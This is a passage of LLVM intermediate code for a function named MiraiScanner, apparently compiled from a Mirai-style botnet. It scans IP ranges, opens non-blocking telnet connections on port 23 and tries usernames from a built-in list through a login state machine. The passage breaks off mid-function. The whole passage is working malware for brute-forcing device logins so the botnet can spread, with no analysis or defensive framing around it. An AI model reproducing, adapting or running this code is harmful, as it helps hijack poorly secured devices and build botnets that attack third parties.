declare i32 @sprintf(i8* noundef, i8* noundef, ...) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @MiraiScanner(i32 noundef %0, i32 noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i64, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca %struct.fd_set*, align 8
  %24 = alloca [80 x i8], align 16
  %25 = alloca [80 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %26 = call i32 @getdtablesize() #10
  %27 = sub nsw i32 %26, 100
  store i32 %27, i32* %5, align 4
  %28 = load i32, i32* %5, align 4
  %29 = load i32, i32* %4, align 4
  %30 = icmp sgt i32 %28, %29
  br i1 %30, label %31, label %33

31:                                               ; preds = %2
  %32 = load i32, i32* %4, align 4
  store i32 %32, i32* %5, align 4
  br label %33

33:                                               ; preds = %31, %2
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = call zeroext i16 @htons(i16 noundef zeroext 23) #12
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %38 = getelementptr inbounds [8 x i8], [8 x i8]* %37, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %38, i8 0, i64 8, i1 false)
  %39 = call noalias i8* @malloc(i64 noundef 1025) #10
  store i8* %39, i8** %17, align 8
  %40 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %40, i8 0, i64 1025, i1 false)
  %41 = load i32, i32* %5, align 4
  %42 = zext i32 %41 to i64
  %43 = call i8* @llvm.stacksave()
  store i8* %43, i8** %19, align 8
  %44 = alloca %struct.telstate_t, i64 %42, align 16
  store i64 %42, i64* %20, align 8
  %45 = bitcast %struct.telstate_t* %44 to i8*
  %46 = load i32, i32* %5, align 4
  %47 = sext i32 %46 to i64
  %48 = mul i64 %47, 5
  call void @llvm.memset.p0i8.i64(i8* align 16 %45, i8 0, i64 %48, i1 false)
  store i32 0, i32* %6, align 4
  br label %49

49:                                               ; preds = %67, %33
  %50 = load i32, i32* %6, align 4
  %51 = load i32, i32* %5, align 4
  %52 = icmp slt i32 %50, %51
  br i1 %52, label %53, label %70

53:                                               ; preds = %49
  %54 = load i32, i32* %6, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %55
  %57 = bitcast %struct.telstate_t* %56 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %57, i8 0, i64 32, i1 false)
  %58 = load i32, i32* %6, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %59
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i32 0, i32 3
  store i8 1, i8* %61, align 1
  %62 = load i8*, i8** %17, align 8
  %63 = load i32, i32* %6, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %64
  %66 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %65, i32 0, i32 9
  store i8* %62, i8** %66, align 8
  br label %67

67:                                               ; preds = %53
  %68 = load i32, i32* %6, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %6, align 4
  br label %49, !llvm.loop !38

70:                                               ; preds = %49
  br label %71

71:                                               ; preds = %886, %70
  br label %72

72:                                               ; preds = %71
  store i32 0, i32* %6, align 4
  br label %73

73:                                               ; preds = %883, %72
  %74 = load i32, i32* %6, align 4
  %75 = load i32, i32* %5, align 4
  %76 = icmp slt i32 %74, %75
  br i1 %76, label %77, label %886

77:                                               ; preds = %73
  %78 = load i32, i32* %6, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %79
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %80, i32 0, i32 7
  %82 = load i32, i32* %81, align 16
  %83 = icmp eq i32 %82, 0
  br i1 %83, label %84, label %91

84:                                               ; preds = %77
  %85 = call i64 @time(i64* noundef null) #10
  %86 = trunc i64 %85 to i32
  %87 = load i32, i32* %6, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %88
  %90 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %89, i32 0, i32 7
  store i32 %86, i32* %90, align 16
  br label %91

91:                                               ; preds = %84, %77
  %92 = load i32, i32* %6, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %93
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %94, i32 0, i32 2
  %96 = load i8, i8* %95, align 8
  %97 = zext i8 %96 to i32
  switch i32 %97, label %882 [
    i32 0, label %98
    i32 1, label %234
    i32 2, label %345
    i32 3, label %397
    i32 4, label %442
    i32 5, label %494
    i32 6, label %539
    i32 7, label %639
    i32 8, label %721
  ]

98:                                               ; preds = %91
  %99 = load i32, i32* %6, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %100
  %102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %101, i32 0, i32 3
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 1
  br i1 %105, label %106, label %126

106:                                              ; preds = %98
  %107 = load i32, i32* %6, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %108
  %110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %109, i32 0, i32 9
  %111 = load i8*, i8** %110, align 8
  store i8* %111, i8** %21, align 8
  %112 = load i32, i32* %6, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %113
  %115 = bitcast %struct.telstate_t* %114 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %115, i8 0, i64 32, i1 false)
  %116 = load i8*, i8** %21, align 8
  %117 = load i32, i32* %6, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %118
  %120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %119, i32 0, i32 9
  store i8* %116, i8** %120, align 8
  %121 = call i32 @MiraiIPRanges()
  %122 = load i32, i32* %6, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %123
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %124, i32 0, i32 1
  store i32 %121, i32* %125, align 4
  br label %174

126:                                              ; preds = %98
  %127 = load i32, i32* %6, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %128
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %129, i32 0, i32 3
  %131 = load i8, i8* %130, align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %132, 0
  br i1 %133, label %134, label %173

134:                                              ; preds = %126
  %135 = load i32, i32* %6, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %136
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %137, i32 0, i32 4
  %139 = load i8, i8* %138, align 2
  %140 = add i8 %139, 1
  store i8 %140, i8* %138, align 2
  %141 = load i32, i32* %6, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %142
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %143, i32 0, i32 5
  %145 = load i8, i8* %144, align 1
  %146 = add i8 %145, 1
  store i8 %146, i8* %144, align 1
  %147 = load i32, i32* %6, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %148
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %149, i32 0, i32 5
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i64
  %153 = icmp eq i64 %152, 1
  br i1 %153, label %154, label %159

154:                                              ; preds = %134
  %155 = load i32, i32* %6, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %156
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %157, i32 0, i32 3
  store i8 1, i8* %158, align 1
  br label %159

159:                                              ; preds = %154, %134
  %160 = load i32, i32* %6, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %161
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %162, i32 0, i32 4
  %164 = load i8, i8* %163, align 2
  %165 = zext i8 %164 to i64
  %166 = icmp eq i64 %165, 1
  br i1 %166, label %167, label %172

167:                                              ; preds = %159
  %168 = load i32, i32* %6, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %169
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %170, i32 0, i32 3
  store i8 1, i8* %171, align 1
  br label %883

172:                                              ; preds = %159
  br label %173

173:                                              ; preds = %172, %126
  br label %174

174:                                              ; preds = %173, %106
  %175 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %175, align 4
  %176 = call zeroext i16 @htons(i16 noundef zeroext 23) #12
  %177 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %176, i16* %177, align 2
  %178 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %179 = getelementptr inbounds [8 x i8], [8 x i8]* %178, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %179, i8 0, i64 8, i1 false)
  %180 = load i32, i32* %6, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %181
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %182, i32 0, i32 1
  %184 = load i32, i32* %183, align 4
  %185 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %186 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %185, i32 0, i32 0
  store i32 %184, i32* %186, align 4
  %187 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #10
  %188 = load i32, i32* %6, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %189
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %190, i32 0, i32 0
  store i32 %187, i32* %191, align 16
  %192 = load i32, i32* %6, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %193
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %194, i32 0, i32 0
  %196 = load i32, i32* %195, align 16
  %197 = icmp eq i32 %196, -1
  br i1 %197, label %198, label %199

198:                                              ; preds = %174
  br label %883

199:                                              ; preds = %174
  %200 = load i32, i32* %6, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %201
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %202, i32 0, i32 0
  %204 = load i32, i32* %203, align 16
  %205 = load i32, i32* %6, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %206
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %207, i32 0, i32 0
  %209 = load i32, i32* %208, align 16
  %210 = call i32 (i32, i32, ...) @fcntl(i32 noundef %209, i32 noundef 3, i8* noundef null)
  %211 = or i32 %210, 2048
  %212 = call i32 (i32, i32, ...) @fcntl(i32 noundef %204, i32 noundef 4, i32 noundef %211)
  %213 = load i32, i32* %6, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %214
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 16
  %218 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %219 = call i32 @connect(i32 noundef %217, %struct.sockaddr* noundef %218, i32 noundef 16)
  %220 = icmp eq i32 %219, -1
  br i1 %220, label %221, label %229

221:                                              ; preds = %199
  %222 = call i32* @__errno_location() #12
  %223 = load i32, i32* %222, align 4
  %224 = icmp ne i32 %223, 115
  br i1 %224, label %225, label %229

225:                                              ; preds = %221
  %226 = load i32, i32* %6, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %227
  call void @reset_telstate(%struct.telstate_t* noundef %228)
  br label %233

229:                                              ; preds = %221, %199
  %230 = load i32, i32* %6, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %231
  call void @advance_telstate(%struct.telstate_t* noundef %232, i32 noundef 1)
  br label %233

233:                                              ; preds = %229, %225
  br label %882

234:                                              ; preds = %91
  br label %235

235:                                              ; preds = %234
  store %struct.fd_set* %12, %struct.fd_set** %23, align 8
  store i32 0, i32* %22, align 4
  br label %236

236:                                              ; preds = %246, %235
  %237 = load i32, i32* %22, align 4
  %238 = zext i32 %237 to i64
  %239 = icmp ult i64 %238, 16
  br i1 %239, label %240, label %249

240:                                              ; preds = %236
  %241 = load %struct.fd_set*, %struct.fd_set** %23, align 8
  %242 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %241, i32 0, i32 0
  %243 = load i32, i32* %22, align 4
  %244 = zext i32 %243 to i64
  %245 = getelementptr inbounds [16 x i64], [16 x i64]* %242, i64 0, i64 %244
  store i64 0, i64* %245, align 8
  br label %246

246:                                              ; preds = %240
  %247 = load i32, i32* %22, align 4
  %248 = add i32 %247, 1
  store i32 %248, i32* %22, align 4
  br label %236, !llvm.loop !39

249:                                              ; preds = %236
  br label %250

250:                                              ; preds = %249
  br label %251

251:                                              ; preds = %250
  %252 = load i32, i32* %6, align 4
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %253
  %255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %254, i32 0, i32 0
  %256 = load i32, i32* %255, align 16
  %257 = srem i32 %256, 64
  %258 = zext i32 %257 to i64
  %259 = shl i64 1, %258
  %260 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %261 = load i32, i32* %6, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %262
  %264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %263, i32 0, i32 0
  %265 = load i32, i32* %264, align 16
  %266 = sdiv i32 %265, 64
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds [16 x i64], [16 x i64]* %260, i64 0, i64 %267
  %269 = load i64, i64* %268, align 8
  %270 = or i64 %269, %259
  store i64 %270, i64* %268, align 8
  %271 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %271, align 8
  %272 = load i32, i32* %3, align 4
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %273, i64* %274, align 8
  %275 = load i32, i32* %6, align 4
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %276
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %277, i32 0, i32 0
  %279 = load i32, i32* %278, align 16
  %280 = add nsw i32 %279, 1
  %281 = call i32 @select(i32 noundef %280, %struct.fd_set* noundef null, %struct.fd_set* noundef %12, %struct.fd_set* noundef null, %struct.timeval* noundef %13)
  store i32 %281, i32* %7, align 4
  %282 = load i32, i32* %7, align 4
  %283 = icmp eq i32 %282, 1
  br i1 %283, label %284, label %322

284:                                              ; preds = %251
  %285 = call i64 @time(i64* noundef null) #10
  %286 = trunc i64 %285 to i32
  %287 = load i32, i32* %6, align 4
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %288
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %289, i32 0, i32 7
  store i32 %286, i32* %290, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %291 = load i32, i32* %6, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %292
  %294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %293, i32 0, i32 0
  %295 = load i32, i32* %294, align 16
  %296 = bitcast i32* %15 to i8*
  %297 = call i32 @getsockopt(i32 noundef %295, i32 noundef 1, i32 noundef 4, i8* noundef %296, i32* noundef %14) #10
  %298 = load i32, i32* %15, align 4
  %299 = icmp ne i32 %298, 0
  br i1 %299, label %300, label %304

300:                                              ; preds = %284
  %301 = load i32, i32* %6, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %302
  call void @reset_telstate(%struct.telstate_t* noundef %303)
  br label %321

304:                                              ; preds = %284
  %305 = load i32, i32* %6, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %306
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %307, i32 0, i32 0
  %309 = load i32, i32* %308, align 16
  %310 = load i32, i32* %6, align 4
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %311
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %312, i32 0, i32 0
  %314 = load i32, i32* %313, align 16
  %315 = call i32 (i32, i32, ...) @fcntl(i32 noundef %314, i32 noundef 3, i8* noundef null)
  %316 = and i32 %315, -2049
  %317 = call i32 (i32, i32, ...) @fcntl(i32 noundef %309, i32 noundef 4, i32 noundef %316)
  %318 = load i32, i32* %6, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %319
  call void @advance_telstate(%struct.telstate_t* noundef %320, i32 noundef 2)
  br label %321

321:                                              ; preds = %304, %300
  br label %883

322:                                              ; preds = %251
  %323 = load i32, i32* %7, align 4
  %324 = icmp eq i32 %323, -1
  br i1 %324, label %325, label %329

325:                                              ; preds = %322
  %326 = load i32, i32* %6, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %327
  call void @reset_telstate(%struct.telstate_t* noundef %328)
  br label %883

329:                                              ; preds = %322
  br label %330

330:                                              ; preds = %329
  %331 = load i32, i32* %6, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %332
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %333, i32 0, i32 7
  %335 = load i32, i32* %334, align 16
  %336 = add i32 %335, 7
  %337 = zext i32 %336 to i64
  %338 = call i64 @time(i64* noundef null) #10
  %339 = icmp slt i64 %337, %338
  br i1 %339, label %340, label %344

340:                                              ; preds = %330
  %341 = load i32, i32* %6, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %342
  call void @reset_telstate(%struct.telstate_t* noundef %343)
  br label %344

344:                                              ; preds = %340, %330
  br label %882

345:                                              ; preds = %91
  %346 = load i32, i32* %6, align 4
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %347
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %348, i32 0, i32 0
  %350 = load i32, i32* %349, align 16
  %351 = load i32, i32* %3, align 4
  %352 = load i32, i32* %6, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %353
  %355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %354, i32 0, i32 9
  %356 = load i8*, i8** %355, align 8
  %357 = call i32 @read_until_response(i32 noundef %350, i32 noundef %351, i8* noundef %356, i32 noundef 1024, i8** noundef getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i64 0, i64 0))
  %358 = icmp ne i32 %357, 0
  br i1 %358, label %359, label %382

359:                                              ; preds = %345
  %360 = call i64 @time(i64* noundef null) #10
  %361 = trunc i64 %360 to i32
  %362 = load i32, i32* %6, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %363
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %364, i32 0, i32 7
  store i32 %361, i32* %365, align 16
  %366 = load i32, i32* %6, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %367
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %368, i32 0, i32 9
  %370 = load i8*, i8** %369, align 8
  %371 = call i32 @contains_fail(i8* noundef %370)
  %372 = icmp ne i32 %371, 0
  br i1 %372, label %373, label %377

373:                                              ; preds = %359
  %374 = load i32, i32* %6, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %375
  call void @advance_telstate(%struct.telstate_t* noundef %376, i32 noundef 0)
  br label %381

377:                                              ; preds = %359
  %378 = load i32, i32* %6, align 4
  %379 = sext i32 %378 to i64
  %380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %379
  call void @advance_telstate(%struct.telstate_t* noundef %380, i32 noundef 3)
  br label %381

381:                                              ; preds = %377, %373
  br label %883

382:                                              ; preds = %345
  %383 = load i32, i32* %6, align 4
  %384 = sext i32 %383 to i64
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %384
  %386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %385, i32 0, i32 7
  %387 = load i32, i32* %386, align 16
  %388 = add i32 %387, 7
  %389 = zext i32 %388 to i64
  %390 = call i64 @time(i64* noundef null) #10
  %391 = icmp slt i64 %389, %390
  br i1 %391, label %392, label %396

392:                                              ; preds = %382
  %393 = load i32, i32* %6, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %394
  call void @reset_telstate(%struct.telstate_t* noundef %395)
  br label %396

396:                                              ; preds = %392, %382
  br label %882

397:                                              ; preds = %91
  %398 = load i32, i32* %6, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %399
  %401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %400, i32 0, i32 0
  %402 = load i32, i32* %401, align 16
  %403 = load i32, i32* %6, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %404
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %405, i32 0, i32 4
  %407 = load i8, i8* %406, align 2
  %408 = zext i8 %407 to i64
  %409 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %408
  %410 = load i8*, i8** %409, align 8
  %411 = load i32, i32* %6, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %412
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %413, i32 0, i32 4
  %415 = load i8, i8* %414, align 2
  %416 = zext i8 %415 to i64
  %417 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %416
  %418 = load i8*, i8** %417, align 8
  %419 = call i64 @strlen(i8* noundef %418) #11
  %420 = call i64 @send(i32 noundef %402, i8* noundef %410, i64 noundef %419, i32 noundef 16384)
  %421 = icmp slt i64 %420, 0
  br i1 %421, label %422, label %426

422:                                              ; preds = %397
  %423 = load i32, i32* %6, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %424
  call void @reset_telstate(%struct.telstate_t* noundef %425)
  br label %883

426:                                              ; preds = %397
  %427 = load i32, i32* %6, align 4
  %428 = sext i32 %427 to i64
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %428
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %429, i32 0, i32 0
  %431 = load i32, i32* %430, align 16
  %432 = call i64 @send(i32 noundef %431, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.487, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  %433 = icmp slt i64 %432, 0
  br i1 %433, label %434, label %438

434:                                              ; preds = %426
  %435 = load i32, i32* %6, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %436
  call void @reset_telstate(%struct.telstate_t* noundef %437)
  br label %883

438:                                              ; preds = %426
  %439 = load i32, i32* %6, align 4
  %440 = sext i32 %439 to i64
  %441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %440
  call void @advance_telstate(%struct.telstate_t* noundef %441, i32 noundef 4)
  br label %882

442:                                              ; preds = %91
  %443 = load i32, i32* %6, align 4
  %444 = sext i32 %443 to i64
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %444
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %445, i32 0, i32 0
  %447 = load i32, i32* %446, align 16
  %448 = load i32, i32* %3, align 4
  %449 = load i32, i32* %6, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %450
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %451, i32 0, i32 9
  %453 = load i8*, i8** %452, align 8
  %454 = call i32 @read_until_response(i32 noundef %447, i32 noundef %448, i8* noundef %453, i32 noundef 1024, i8** noundef getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i64 0, i64 0))
  %455 = icmp ne i32 %454, 0
  br i1 %455, label %456, label %479

456:                                              ; preds = %442
  %457 = call i64 @time(i64* noundef null) #10
  %458 = trunc i64 %457 to i32
  %459 = load i32, i32* %6, align 4
  %460 = sext i32 %459 to i64
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %460
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %461, i32 0, i32 7
  store i32 %458, i32* %462, align 16
  %463 = load i32, i32* %6, align 4
  %464 = sext i32 %463 to i64
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %464
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %465, i32 0, i32 9
  %467 = load i8*, i8** %466, align 8
  %468 = call i32 @contains_fail(i8* noundef %467)
  %469 = icmp ne i32 %468, 0
  br i1 %469, label %470, label %474

470:                                              ; preds = %456
  %471 = load i32, i32* %6, align 4
  %472 = sext i32 %471 to i64
  %473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %472
  call void @advance_telstate(%struct.telstate_t* noundef %473, i32 noundef 0)
  br label %478

474:                                              ; preds = %456
  %475 = load i32, i32* %6, align 4
  %476 = sext i32 %475 to i64
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %476
  call void @advance_telstate(%struct.telstate_t* noundef %477, i32 noundef 5)
  br label %478

478:                                              ; preds = %474, %470
  br label %883

479:                                              ; preds = %442
  %480 = load i32, i32* %6, align 4
  %481 = sext i32 %480 to i64
  %482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %481
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %482, i32 0, i32 7
  %484 = load i32, i32* %483, align 16
  %485 = add i32 %484, 7
  %486 = zext i32 %485 to i64
  %487 = call i64 @time(i64* noundef null) #10
  %488 = icmp slt i64 %486, %487
  br i1 %488, label %489, label %493

489:                                              ; preds = %479
  %490 = load i32, i32* %6, align 4
  %491 = sext i32 %490 to i64
  %492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %491
  call void @reset_telstate(%struct.telstate_t* noundef %492)
  br label %493

493:                                              ; preds = %489, %479
  br label %882

494:                                              ; preds = %91
